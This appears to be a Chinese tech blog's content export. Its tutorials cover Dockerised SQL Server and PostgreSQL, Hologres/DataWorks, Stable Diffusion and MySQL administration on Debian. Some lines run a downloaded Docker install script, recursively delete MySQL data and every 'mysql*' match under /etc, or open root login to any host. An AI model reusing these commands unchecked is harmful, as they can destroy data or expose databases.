&quot;MSSQL_SA_PASSWORD=Admin@123&quot; -p 1433:1433 --name sql1 --hostname sql1 -d mcr.microsoft.com/mssql/server:2017-latest 进入1234sudo docker exec -it sql1 &quot;bash&quot;/opt/mssql-tools/bin/sqlcmd -S localhost -U SA -P &quot;Admin@123&quot; 123456789101112131415161718CREATE DATABASE TestDB;goSELECT Name from sys.databases;gouse TestDB;go;CREATE TABLE Employees ( EmployeeID INT PRIMARY KEY, FirstName NVARCHAR(50), LastName NVARCHAR(50), BirthDate DATE, Position NVARCHAR(50) );INSERT INTO Employees (EmployeeID, FirstName, LastName, BirthDate, Position) VALUES (1, &#x27;z&#x27;, &#x27;s&#x27;, &#x27;2000-01-01&#x27;, &#x27;Software Developer&#x27;);INSERT INTO Employees (EmployeeID, FirstName, LastName, BirthDate, Position) VALUES (2, &#x27;l&#x27;, &#x27;s&#x27;, &#x27;2001-01-15&#x27;, &#x27;Project Manager&#x27;);INSERT INTO Employees (FirstName, LastName, BirthDate, Position) VALUES ( &#x27;l1&#x27;, &#x27;s&#x27;, &#x27;2001-01-15&#x27;, &#x27;Project Manager&#x27;);SELECT * FROM Employees; py测试1pip install pyodbc 12345678910111213141516171819202122232425262728import pyodbc# 配置数据库连接信息server = &#x27;localhost&#x27;database = &#x27;TestDB&#x27;username = &#x27;SA&#x27;password = &#x27;Admin@123&#x27;driver = &#x27;&#123;ODBC Driver 17 for SQL Server&#125;&#x27; # 根据你的SQL Server版本选择合适的驱动# 建立连接connection_string = f&quot;DRIVER=&#123;driver&#125;;SERVER=&#123;server&#125;;DATABASE=&#123;database&#125;;UID=&#123;username&#125;;PWD=&#123;password&#125;&quot;conn = pyodbc.connect(connection_string)cursor = conn.cursor()# 执行查询query = &quot;SELECT * FROM Employees&quot;cursor.execute(query)rows = cursor.fetchall()# 打印结果for row in rows: print(row)# 关闭连接cursor.close()conn.close() 1python mssql.py (1, ‘z’, ‘s’, datetime.date(2000, 1, 1), ‘Software Developer’)(2, ‘l’, ‘s’, datetime.date(2001, 1, 15), ‘Project Manager’) backup12345678USE master;goBACKUP DATABASE [TestDB]TO DISK = &#x27;C:\\path\\YourDatabaseName.bak&#x27; WITH FORMAT; restore1234567USE master; GO ALTER DATABASE [TestDB] SET SINGLE_USER WITH ROLLBACK IMMEDIATE;RESTORE DATABASE [TestDB] FROM DISK = &#x27;C:\\path\\YourDatabaseName.bak&#x27; WITH REPLACE;ALTER DATABASE [TestDB] SET MULTI_USER; 1docker stop sql1 停止","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://banjinmei.github.io/tags/docker/"},{"name":"mssql","slug":"mssql","permalink":"https://banjinmei.github.io/tags/mssql/"},{"name":"python","slug":"python","permalink":"https://banjinmei.github.io/tags/python/"}],"author":"mu"},{"title":"Hologres DataWorks","slug":"Hologres-DataWorks","date":"2024-08-15T14:49:43.000Z","updated":"2024-08-15T15:14:58.000Z","comments":true,"path":"2024/08/15/Hologres-DataWorks/","permalink":"https://banjinmei.github.io/2024/08/15/Hologres-DataWorks/","excerpt":"","text":"实时数仓HologresHologres是阿里云自研一站式实时数仓，统一数据平台架构，支持海量结构化&#x2F;半结构化数据的实时写入、实时更新、实时加工、实时分析，支持标准SQL（兼容PostgreSQL协议），无缝对接主流BI工具，支持OLAP查询、即席分析、在线服务、向量计算多个场景，分析性能打破TPC-H世界记录，与MaxCompute、Flink、DataWorks深度融合，提供离在线一体化全栈数仓解决方案。 大数据开发治理平台DataWorksDataWorks基于阿里云ODPS&#x2F;EMR&#x2F;CDP等大数据引擎，为数据仓库&#x2F;数据湖&#x2F;湖仓一体等解决方案提供统一的全链路大数据开发治理平台。作为阿里巴巴数据中台的建设者，DataWorks从2009年起不断沉淀阿里巴巴大数据建设方法论，同时与数万名政务&#x2F;金融&#x2F;零售&#x2F;互联网&#x2F;能源&#x2F;制造等客户携手，助力产业数字化升级。 DataV数据可视化数据可视化DataV是阿里云数据可视化应用搭建平台，旨让更多的人看到数据可视化的魅力，帮助非专业的工程师通过图形化的界面轻松搭建专业水准的可视化应用，满足您会议展览、业务监控、风险预警、地理信息分析等多种业务的展示需求。 Hologres 64core VS ClickHouse 64core在单表测试的13个查询中，11个查询Hologres比Clickhouse更快。Clickhouse总耗时是Hologres的1.35倍。 高性能实时写入与更新通过Hologres Fixed Plan能力，实现高性能的实时写入与更新 Hologres Binlog:全链路的实时开发体验，简化数仓分层通过Hologres Binl0g，结合Flink，可以实现全链路的实时开发体验，达到像Kafka、datahub同等的消息队列能力，简化数仓分层体验，增加数据复用能力。 Runtime Filter:自动优化大小表Join效率计算组(warehouse)实例:资源隔离、弹性、自动切流 Serverless Computing:提供大作业隔离与弹性处理通过共享Serverless资源执行DML任务，保证大任务隔高与高可用，降低成本并提升性能。同时支持设置单条SOL使用Serverless的资源上限，支持设置使用Serverless资源的SOL优先级 案例小红书 ClickHouse Only 7天乐元素:替换Hive+Presto构建高性能游戏运营分析平白流量分析 开箱可用 性能比手写sql快10倍 节约成本https://www.aliyun.com/activity/bigdata/hologres_cases 电商漏斗模型分析漏斗模型有助于企业识别在客户购买过程中的各个环节，通过优化漏斗的各个阶段来增加转化率，提升销售业绩。本案例将分析电商场景的漏斗模型、计算各环节的转化率。 智慧城市人口财产主题分析采集各个领域的数据进行整合和分析，使得城市管理更高效、服务更贴心。本案例以城市人口财产主题分析为背景，为您介绍DataWorks在智慧城市项目中的应用。 视频个性化推荐(协同过滤)协同过滤算法是一种用于个性化推荐的技术，它可以基于用户间的行为相似性或物品间的相似性为用户推荐物品。本案例将为您介绍在DataWorks中如何使用阿里云PAI的协同过滤算法实现视频的个性化推荐。 实操mysql -&gt; hologres创建专有网络VPC和交换机192.168.0.0&#x2F;16。开通DataWorks创建公网NAT 创建Hologres表登录Hologres控制台。新建库，新建表 12345678910111213141516171819202122232425262728293031323334353637383940-- 新建schema用于创建内表并导入数据CREATE SCHEMA IF NOT EXISTS hologres_dataset_github_event;DROP TABLE IF EXISTS hologres_dataset_github_event.hologres_github_event;BEGIN;CREATE TABLE hologres_dataset_github_event.hologres_github_event ( id bigint PRIMARY KEY, actor_id bigint, actor_login text, repo_id bigint, repo_name text, org_id bigint, org_login text, type text, created_at timestamp with time zone NOT NULL, action text, commit_id text, member_id bigint, language text);CALL set_table_property (&#x27;hologres_dataset_github_event.hologres_github_event&#x27;, &#x27;distribution_key&#x27;, &#x27;id&#x27;);CALL set_table_property (&#x27;hologres_dataset_github_event.hologres_github_event&#x27;, &#x27;event_time_column&#x27;, &#x27;created_at&#x27;);CALL set_table_property (&#x27;hologres_dataset_github_event.hologres_github_event&#x27;, &#x27;clustering_key&#x27;, &#x27;created_at&#x27;);COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.id IS &#x27;事件ID&#x27;;COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.actor_id IS &#x27;事件发起⼈ID&#x27;;COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.actor_login IS &#x27;事件发起⼈登录名&#x27;;COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.repo_id IS &#x27;repoID&#x27;;COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.repo_name IS &#x27;repo名称&#x27;;COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.org_id IS &#x27;repo所属组织ID&#x27;;COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.org_login IS &#x27;repo所属组织名称&#x27;;COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.type IS &#x27;事件类型&#x27;;COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.created_at IS &#x27;事件发⽣时间&#x27;;COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.action IS &#x27;事件行为&#x27;;COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.commit_id IS &#x27;提交记录ID&#x27;;COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.member_id IS &#x27;成员ID&#x27;;COMMENT ON COLUMN hologres_dataset_github_event.hologres_github_event.language IS &#x27;编程语⾔&#x27;;COMMIT; 实时同步数据至Hologres登录DataWorks控制台。管理中心。 数据源名称:自定义数据源名称，mysqlData。 配置模式:选择连接串模式。 JDBC连接地址:单击新增地址，配置信息如下： 主机地址IP：rm-bp1z69dodhh85z9qa.mysql.rds.aliyuncs.com 端⼝号：3306 输入数据库名称后，完整的JDBC URL为 jdbc:mysql:&#x2F;&#x2F;rm-bp1z69dodhh85z9qa.mysql.rds.aliyuncs.com:3306 &#x2F;github_events_share 数据库名称:github_events_share 用户名:workshop 创建实时同步任务在数据集成页面，在创建同步任务中，选择来源与去向数据源，单击开始创建。 来源：选择MySQL。 去向：选择Hologres。 目标表映射勾选github_public_event表，单击批量刷新映射。基于上述已创建的Hologres内部表，将目标Schema名改为hologres_dataset_github_event，目标表名改为hologres_github_event，单击完成配置。 当结构迁移和全量初始化完成后，表示数据同步已成功，就可以登录Hologres进行实时数据分析。 实时OLAP分析123456789101112SELECT repo_name, COUNT(*) AS eventsFROM hologres_dataset_github_event.hologres_github_eventWHERE created_at &gt;= now() - interval &#x27;1 day&#x27;GROUP BY repo_nameORDER BY events DESCLIMIT 5; 查询实时更新的过去24小时GitHub最活跃项⽬。","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"Hologres","slug":"Hologres","permalink":"https://banjinmei.github.io/tags/Hologres/"},{"name":"mysql","slug":"mysql","permalink":"https://banjinmei.github.io/tags/mysql/"}],"author":"mu"},{"title":"docker postgresql","slug":"docker-postgresql","date":"2024-08-14T15:02:46.000Z","updated":"2024-08-14T15:04:28.000Z","comments":true,"path":"2024/08/14/docker-postgresql/","permalink":"https://banjinmei.github.io/2024/08/14/docker-postgresql/","excerpt":"","text":"创建容器1docker run -id --name=postgresql -v postgre-data:/var/lib/postgresql/data -p 5432:5432 -e POSTGRES_PASSWORD=123456 -e LANG=C.UTF-8 postgres 进入1docker exec -it my-postgres psql -U postgres 123456789SELECT version();create database test_db;CREATE TABLE test_table ( id SERIAL PRIMARY KEY, name VARCHAR(50) NOT NULL, age INTEGER );INSERT INTO test_table (name, age) VALUES (&#x27;m&#x27;, 30);SELECT * FROM test_table; nodejs测试123456789101112131415161718192021222324252627282930// 引入 &#x27;pg&#x27; 模块const &#123; Client &#125; = require(&#x27;pg&#x27;);// 设置数据库连接参数const client = new Client(&#123; user: &#x27;postgres&#x27;, host: &#x27;localhost&#x27;, database: &#x27;test_db&#x27;, password: &#x27;123456&#x27;, port: 5432, &#125;);// 连接到数据库client.connect() .then(() =&gt; &#123; console.log(&#x27;已连接到PostgreSQL数据库&#x27;); // 执行查询 return client.query(&#x27;SELECT NOW()&#x27;);// 获取当前时间 &#125;) .then(res =&gt; &#123; console.log(&#x27;结果:&#x27;, res.rows); &#125;) .catch(err =&gt; &#123; console.error(&#x27;错误:&#x27;, err.stack); &#125;) .finally(() =&gt; &#123; // 关闭连接 client.end(); &#125;); C#nugetNpgsql 12345678910111213141516171819202122232425262728293031// PostgreSQL 数据库连接字符串string connString = &quot;Host=localhost;Port=5432;Username=postgres;Password=123456;Database=test_db&quot;;using (var conn = new NpgsqlConnection(connString))&#123; try &#123; // 打开数据库连接 conn.Open(); Console.WriteLine(&quot;已连接到PostgreSQL数据库&quot;); // 查询示例，获取当前时间 string sql = &quot;SELECT NOW()&quot;; using (NpgsqlCommand cmd = new NpgsqlCommand(sql, conn)) &#123; // 执行查询并输出结果 var reader = cmd.ExecuteReader(); while (reader.Read()) &#123; Console.WriteLine(&quot;当前时间: &quot; + reader.GetDateTime(0)); &#125; &#125; &#125; catch (Exception ex) &#123; Console.WriteLine(ex.ToString()); &#125;&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://banjinmei.github.io/tags/docker/"},{"name":"postgresql","slug":"postgresql","permalink":"https://banjinmei.github.io/tags/postgresql/"}],"author":"mu"},{"title":"stable diffusion","slug":"stable-diffusion","date":"2024-08-13T13:22:29.000Z","updated":"2024-08-13T14:02:26.000Z","comments":true,"path":"2024/08/13/stable-diffusion/","permalink":"https://banjinmei.github.io/2024/08/13/stable-diffusion/","excerpt":"","text":"背景知识部署Stable Diffusion，内置模型库+常用插件+ControlNet。 这是一项接近零基础的教程，其中并不会包含复杂的概念或者深奥的算法。换句话说，只要你稍有计算机基础，了解如何敲入命令，知道怎么使用浏览器打开网页，您就能很轻松的完成这个实验。 AI生成内容的形式相当丰富，除了文字外，还可以进行绘画、作曲、演唱、编剧、设计等。最近热度非常高的Text to Image就是AI加持下非常时髦的一种图片创造方式。看看下面这些图片，你一定很难想象它们都是AI生成的吧。 许多人可能觉得，使用AIGC有很高的门槛，普通人是很难入门的。其实不然，随着AI技术的快速发展以及众多开源项目的诞生，我们每个人都可以很轻松且廉价的使用到AIGC。谁能想到，在2018 年，人工智能生成的画作在佳士得拍卖价还高达43.25万美元，而时隔才数年，让AI为我们创作绘画已经成了人人触手可及的事情。 在这些开源项目中，Stable Diffusion无疑是优秀生之一。Stable Diffusion是一种扩散模型（Diffusion Model）的变体，称为“潜在扩散模型”（Latent Diffusion Model），由CompVis、Stability AI和LAION的研究人员和工程师创建。 它使用来自LAION-5B数据库子集的图像进行训练。使用这个模型，可以生成包括人脸在内的任何图像，因为有开源的预训练模型，所以我们也可以在自己的机器上运行它。Stable Diffusion能够根据我们提供的一些提示词以及可以调整的部分参数，通过模型计算生成一张不错的图片。 函数计算FC 函数计算（Function Compute）是一个事件驱动的全托管 Serverless 计算服务，您无需管理服务器等基础设施，只需编写代码并上传，函数计算会为您准备好计算资源，并以弹性、可靠的方式运行代码。 SD1.5动漫风格真人风格轻量版TensorRT艺术字 提示词就是生成图片的依据，既可以是描述需要生成内容的词，例如girl, sunset, forest等；也可以是用于是描述图像属性的词，例如best quality, beautiful, masterpiece等。我们甚至可以通过提示词选择图片生成的视角、光线、画风；人物的姿势、着装、表情、背景的内容等。 建议加上画风描述词，让您的图片更加美观，如：Cyberpunk（赛博朋克），shinkai makoto（新海诚），Ghibli Studio（吉卜力），Paul Gauguin（梵高）等等 SD提示词qwen你是一个优秀的导演和Stable Difusion专家。接下来我们要共同完成一部电视剧的AI创作，请你根据我给你的场景，尽可能详细地描述场景的画面，并给出制作这个场累的Stable Difusion 英语提示词，所有提示词中都要加上“画面比例16:9,超写实，高质量，”的英语，场景描述不少于200字，提示词不少于30个单词。如果你明白了，请回复“明白”，然后我将开始发给你场景。场景一:一个12岁的少年百里东君在一棵桃花树上躺着闭目养神，手上拿着一个白玉酒杯，穿着浅蓝色的长袍，带一点点花纹样式，腰间佩着长剑，阳光透过树叶酒在他的脸上，远，落雪飞，桃花盛开，显示小河，远处的凉亭、茅屋、草坪。 prompt:Prompt for Stable Diffusion:“Scene ratio 16:9, hyper-realistic, high-quality. A 12-year-old boy in ancient Chinese clothing, wearing a light blue robe with intricate patterns, lying on a branch of a peach blossom tree. He holds a white jade wine cup in his hand and has a long sword at his waist. Snowflakes and peach blossoms mix together as they fall, while sunlight filters through the branches. There’s a small river, a pavilion, and a thatched cottage in the background, all set against a backdrop of green grass and a serene landscape.” 采样步数40 高度1980 宽度1080 提示词引导 高 种子1反向提示词 写入不要什么 扩展 高级定制 lora模型https://www.liblib.art/ 我们可以从LiblibAI下载lora模型到本地，然后把它上传到&#x2F;mnt&#x2F;auto&#x2F;sd&#x2F;models&#x2F;Lora&#x2F;目录。 前往LiblibAI，进行基础模型的筛选。 拓展 ControlNet使用ControlNet包含插件和模型两部分。为了降低费用消耗，建议先下载到本地后，通过admin上传至NAS。 ControlNet插件地址。 项目地址：https://github.com/Mikubill/sd-webui-controlnet。 进入页面后，单击右侧的Code，并选择Download ZIP下载插件代码。","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://banjinmei.github.io/tags/AI/"},{"name":"SD","slug":"SD","permalink":"https://banjinmei.github.io/tags/SD/"}],"author":"mu"},{"title":"debian mysql","slug":"debian-mysql","date":"2024-08-12T13:47:36.000Z","updated":"2024-11-29T19:02:29.856Z","comments":true,"path":"2024/08/12/debian-mysql/","permalink":"https://banjinmei.github.io/2024/08/12/debian-mysql/","excerpt":"","text":"1.更新软件包列表运行 apt update 命令来完成。 sudo apt update 2. 安装MySQL APT配置工具安装MySQL 1234567wget https://dev.mysql.com/get/mysql-apt-config_0.8.32-1_all.debapt install gnupgdpkg -i mysql-apt-config_0.8.32-1_all.debapt update 3. 安装MySQL服务器1apt install mysql-server 4 . 更新软件包列表以便APT可以识别新添加的MySQL仓库。 1sudo apt update 5. 启动MySQL服务启动MySQL服务并设置它在系统启动时自动启动。 123sudo systemctl start mysqlsudo systemctl enable mysql 6. 登录MySQL服务器使用root用户登录到MySQL服务器。 1mysql -u root -p 输入密码后，您将进入MySQL命令行。使用 exit 命令退出。 1234567ALTER USER &#x27;myuser&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;new_password&#x27;; 可选 7.测试1CREATE DATABASE mydatabase; Query OK, 1 row affected (0.00 sec) 123456789101112131415CREATE USER &#x27;myuser&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;mypassword&#x27;;GRANT ALL PRIVILEGES ON mydatabase.* TO &#x27;myuser&#x27;@&#x27;localhost&#x27;;FLUSH PRIVILEGES;Use mydatabase;CREATE TABLE `Test` ( `id` INT NOT NULL AUTO_INCREMENT, `name` VARCHAR(100) NOT NULL, `age` INT NOT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;Insert into Test(name,age) value (&#x27;zs&#x27;,17);SELECT * FROM Test python mysql test 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#pip install mysql-connector-pythonimport mysql.connectorfrom mysql.connector import Errordef create_connection(host_name, user_name, user_password, db_name): connection = None try: connection = mysql.connector.connect( host=host_name, user=user_name, passwd=user_password, database=db_name ) print(&quot;Connection to MySQL DB successful&quot;) except Error as e: print(f&quot;The error &#x27;&#123;e&#125;&#x27; occurred&quot;) return connectiondef execute_read_query(connection, query): cursor = connection.cursor() result = None try: cursor.execute(query) result = cursor.fetchall() return result except Error as e: print(f&quot;The error &#x27;&#123;e&#125;&#x27; occurred&quot;)# Replace with your actual credentials 3306host = &quot;39.108.xxxxx&quot; user = &quot;root&quot;password = &quot;xx.zxcv&quot;database = &quot;xx&quot;connection = create_connection(host, user, password, database)query = &quot;SELECT * FROM test LIMIT 5&quot; # Replace &#x27;your_table&#x27; with the name of your tableresults = execute_read_query(connection, query)for result in results: print(result)# Remember to close the connection when you&#x27;re doneif connection.is_connected(): connection.close() print(&quot;MySQL connection is closed&quot;) 8. 重启MySQL服务保存并关闭文件后，重新启动MySQL服务以应用更改。 12345678#restartsudo systemctl restart mysql#停止sudo systemctl stop mysql#statussystemctl status mysql 查看状态 9. 备份1234mysql -u 用户名 -p 数据库名 &lt; 文件路径.sqlmysql -u 用户名 -p -e &quot;CREATE DATABASE mydatabase;&quot;mysql -u 用户名 -p mydatabase &lt; /path/to/backup.sql 10.docker1docker run --name myadmin -d -e PMA_ARBITRARY=1 -p 12121:80 phpmyadmin err1130 (HY000): HostHost is not allowed to connect to this MySQL server mysql&gt;use mysql; &#x2F;&#x2F;选中数据库 mysql&gt;select ‘host’ from user where user&#x3D;’root’; &#x2F;&#x2F;查看该表的值 mysql&gt;update user set host &#x3D; ‘%’ where user &#x3D;’root’; &#x2F;&#x2F;修改 mysql&gt;flush privileges; &#x2F;&#x2F;刷新数据库 检查MySQL服务器的配置文件（如 my.cnf 或 my.ini），确保没有禁止远程连接的相关设置， bind-address 参数通常需要设置为 0.0.0.0 或者指定的公网IP地址以接受远程连接。 mysql卸载卸载 –卸载当前MySQL实例： 123sudo apt-get remove --purge mysql-server mysql-client mysql-commonsudo apt-get autoremovesudo apt-get autoclean 删除MySQL的数据目录（默认为&#x2F;var&#x2F;lib&#x2F;mysql）： 1sudo rm -rf /var/lib/mysql 清理残留的配置文件： 1sudo find /etc -name &quot;mysql*&quot; | sudo xargs rm -rf 更新包管理器的索引： 1sudo apt-get update 重新安装MySQL服务器： 1sudo apt-get install mysql-server ---sql 远程错误 Host is not allowed to connect to this MySQL server通过远程客户端访问MySQL服务器时会遇到“Host is not allowed to connect to this MySQL server”的错误提示。 原因MySQL服务器当前配置不允许来自特定主机的连接尝试。 解决方法允许远程主机访问MySQL服务器，按照以下步骤操作： 登录本地MySQL服务器：以管理员身份登录到MySQL服务器，输入MySQL root用户的密码： 1mysql -u root -p 选择MySQL数据库：登录成功后，切换到MySQL系统数据库： 1use mysql; 更新用户权限：修改root用户的host字段（或其他需要远程访问的用户），允许任意远程主机（用 ‘%’ 表示）进行连接，但这一步可能涉及到安全风险，建议只针对需要远程访问的特定用户设置具体的远程IP地址，而不是使用通配符 % 开启所有远程访问： 1update user set host = &#x27;%&#x27; where user = &#x27;root&#x27;; 刷新权限： 1flush privileges; 防火墙设置：确保服务器的防火墙规则允许MySQL服务端口（默认为3306）上的入站流量。 MySQL配置文件：检查MySQL服务器的配置文件（如 my.cnf 或 my.ini），确保没有禁止远程连接的相关设置， bind-address 参数通常需要设置为 0.0.0.0 或者指定的公网IP地址以接受远程连接。 使用命令行备份特定表在MySQL中，如果您想要备份特定的表而不是整个数据库，可以使用mysqldump工具来完成。以下是具体的操作步骤： 假设您的数据库名为mydatabase，需要备份的表为table1和table2。 命令格式： 1mysqldump -u [username] -p[password] [database_name] [table_name1] [table_name2] &gt; [output_file.sql] 示例： 1mysqldump -u root -p mydatabase table1 table2 &gt; backup.sql -u root：指定用户名为root。-p：提示输入密码（为了安全，密码不会直接显示在命令行中）。mydatabase：要备份的数据库名。table1 table2：需要备份的表名。 backup.sql：将输出重定向到backup.sql文件中。 注意事项确保您有足够的权限访问指定的数据库和表。如果您的数据库或表名包含特殊字符或者空格，请确保用引号括起来。在生产环境中执行此操作前，最好先在一个测试环境中测试命令，以避免任何可能的数据丢失或错误。考虑定期检查备份文件的完整性和可恢复性。 1mysqldump -u root -p mydatabase table1 table2 &gt; backup.sql 使用 mysqldump 命令备份数据库中的特定表后，可以通过 mysql 命令来恢复这些表的数据。以下是还原命令的基本格式： 1mysql -u root -p mydatabase &lt; backup.sql 在这个命令中： -u root 指定MySQL的用户名为root。-p 表示接下来会提示输入该用户的密码。mydatabase 是要还原数据的目标数据库名。&lt; backup.sql 表示将备份文件 backup.sql 中的内容导入到指定的数据库中。 在执行上述命令前，请确保： 目标数据库 mydatabase 已经存在。如果不存在，需要先创建它： 1CREATE DATABASE mydatabase; 有足够的权限去操作这个数据库。如果不确定是否有足够的权限，可以联系数据库管理员或者使用具有足够权限的账户。备份文件 backup.sql 的路径是正确的，并且文件是可访问的。 另外，如果在恢复过程中遇到错误，例如因为表已经存在而无法导入数据，可以选择先删除这些表再进行恢复，或者在导入之前修改SQL文件，以避免这些冲突。如果希望覆盖已存在的表，可以在导入前删除它们，或者使用 –force 参数来忽略错误： 1mysql -u root -p --force mydatabase &lt; backup.sql 请注意，使用 –force 参数可能会导致数据丢失或损坏，因此请谨慎使用。在进行任何数据操作之前，建议再次确认备份文件的正确性和完整性。 修改MySQL端口的步骤：停止MySQL服务：首先，需要停止MySQL服务以确保在修改配置文件时不会有冲突。 1sudo systemctl stop mysql 备份配置文件：在修改配置文件之前，建议备份原始的配置文件。 1sudo cp /etc/mysql/my.cnf /etc/mysql/my.cnf.bak 编辑配置文件：使用文本编辑器打开MySQL的主配置文件my.cnf。这个文件通常位于&#x2F;etc&#x2F;mysql&#x2F;目录下。 1sudo nano /etc/mysql/my.cnf 或者使用其他喜欢的编辑器。 修改端口：在my.cnf文件中找到[mysqld]部分，并添加或修改port指令，将其设置为想要使用的端口号。例如，如果想将端口修改为3307，可以这样设置： 12[mysqld]port = 3307 确保这个端口号没有被其他服务占用。 保存并退出编辑器：如果使用的是nano，可以按Ctrl + X，然后按Y保存更改，最后按Enter退出。 重启MySQL服务：修改配置文件后，需要重启MySQL服务以使更改生效。 1sudo systemctl start mysql 检查端口：使用netstat命令检查MySQL服务是否正在监听新的端口。 1sudo netstat -tulnp | grep mysql 应该能看到MySQL正在监听指定的新端口。 更新防火墙规则 ufw ：如果的Debian系统使用了防火墙，确保更新防火墙规则以允许流量通过新的MySQL端口。 1sudo ufw allow 3307/tcp","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"debian","slug":"debian","permalink":"https://banjinmei.github.io/tags/debian/"},{"name":"mysql","slug":"mysql","permalink":"https://banjinmei.github.io/tags/mysql/"}],"author":"mu"},{"title":"debian apt update","slug":"debian-apt-update","date":"2024-08-12T13:41:40.000Z","updated":"2024-08-12T13:46:54.000Z","comments":true,"path":"2024/08/12/debian-apt-update/","permalink":"https://banjinmei.github.io/2024/08/12/debian-apt-update/","excerpt":"","text":"debian更换apt源在Debian系统中更换APT源，你需要编辑&#x2F;etc&#x2F;apt&#x2F;sources.list文件，将其中的现有源地址替换为新的源地址。以下是一个基本的步骤和示例： 打开终端。 使用文本编辑器编辑sources.list文件，例如使用nano或vim： 1sudo nano /etc/apt/sources.list 或者 1sudo vim /etc/apt/sources.list 注释掉或删除旧的源地址行（在行首加#可以将其注释掉）。 添加新的源地址。例如，Debian官方的非US源，可以添加以下行： 12deb http://deb.debian.org/debian bullseye main contrib non-freedeb-src http://deb.debian.org/debian bullseye main contrib non-free 这里的bullseye是Debian的代号，例如bookworm、buster等。 1deb http://mirrors.aliyun.com/debian/ stable main contrib non-free 保存文件并退出编辑器。 更新APT源： 1sudo apt update 升级已安装的包： 1sudo apt upgrade 请确保你使用的源与你的Debian版本兼容。可信的源可以保证软件包的安全和可靠性。","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"debian","slug":"debian","permalink":"https://banjinmei.github.io/tags/debian/"}],"author":"mu"},{"title":"docker ittools","slug":"docker-ittools","date":"2024-08-07T14:24:52.000Z","updated":"2024-08-12T13:41:26.000Z","comments":true,"path":"2024/08/07/docker-ittools/","permalink":"https://banjinmei.github.io/2024/08/07/docker-ittools/","excerpt":"","text":"ittoolshttps://github.com/CorentinTh/it-tools/tree/main pnpmhttps://www.pnpm.cn/installation#%E4%BD%BF%E7%94%A8-npm-%E5%AE%89%E8%A3%85 Project Setup1pnpm install Compile and Hot-Reload for Development1pnpm dev Type-Check, Compile and Minify for Production1pnpm build Run Unit Tests with Vitest1pnpm test Lint with ESLint1pnpm lint Create a new toolTo create a new tool, there is a script that generate the boilerplate of the new tool, simply run: 1pnpm run script:create:tool my-tool-name docker run1docker run -d --name it-tools --restart unless-stopped -p 8080:80 corentinth/it-tools:latest","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://banjinmei.github.io/tags/docker/"},{"name":"it","slug":"it","permalink":"https://banjinmei.github.io/tags/it/"}],"author":"mu"},{"title":"Email Server","slug":"Email-Server","date":"2024-08-06T11:33:24.000Z","updated":"2024-08-07T14:23:06.000Z","comments":true,"path":"2024/08/06/Email-Server/","permalink":"https://banjinmei.github.io/2024/08/06/Email-Server/","excerpt":"","text":"docker1docker run -d -p 25:25 -p 80:80 -p 110:110 -p 143:143 -p 443:443 -p 587:587 -p 993:993 -p 995:995 -v /etc/localtime:/etc/localtime:ro -v /data/poste/data:/data --name &quot;PosteServ&quot; -h &quot;mx.xxxxxx.com&quot; -t analogic/poste.io 解析 mx A记录开放25 80 110 143 443 587 993 995端口 #&#x2F;srv&#x2F;poste&#x2F;data为Poste数据存放文件夹，如用户数据库、电子邮件、日志，方便备份。 443为web控制台端口ip端口访问https://ip 访问添加管理邮箱First poste.io configuration There is no “server.ini” in your data folder, we will try create one. You can update it later in your data folder. 创建邮箱adm https://ip/webmail登录邮箱 API&#x2F;admin&#x2F;api&#x2F;doc api","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://banjinmei.github.io/tags/docker/"},{"name":"email","slug":"email","permalink":"https://banjinmei.github.io/tags/email/"}],"author":"mu"},{"title":"Debian docker mssql","slug":"Debian-docker-mssql","date":"2024-08-06T11:30:54.000Z","updated":"2024-08-06T12:22:22.000Z","comments":true,"path":"2024/08/06/Debian-docker-mssql/","permalink":"https://banjinmei.github.io/2024/08/06/Debian-docker-mssql/","excerpt":"","text":"docker12curl -fsSL https://get.docker.com -o get-docker.shsudo sh get-docker.sh 查看架构 12uname -m 安装1docker run -e &quot;ACCEPT_EULA=Y&quot; -e &quot;SA_PASSWORD=Qq123123.&quot; -e &quot;TZ=Asia/Shanghai&quot; -p 1433:1433 --name sqlserver2022 -d mcr.microsoft.com/mssql/server:2022-latest 开放端口 1433 进入容器 1docker exec -it sqlserver2022 /bin/bash 使用navicat testsa Qq123123. 测试连接 SQL测试 1234567891011121314151617CREATE DATABASE mydb;GOUSE mydb;GOCREATE TABLE Users ( UserId INT PRIMARY KEY IDENTITY(1,1), UserName NVARCHAR(50) NOT NULL);GOINSERT INTO Users (UserName) VALUES (&#x27;zs&#x27;);INSERT INTO Users (UserName) VALUES (&#x27;ls&#x27;);INSERT INTO Users (UserName) VALUES 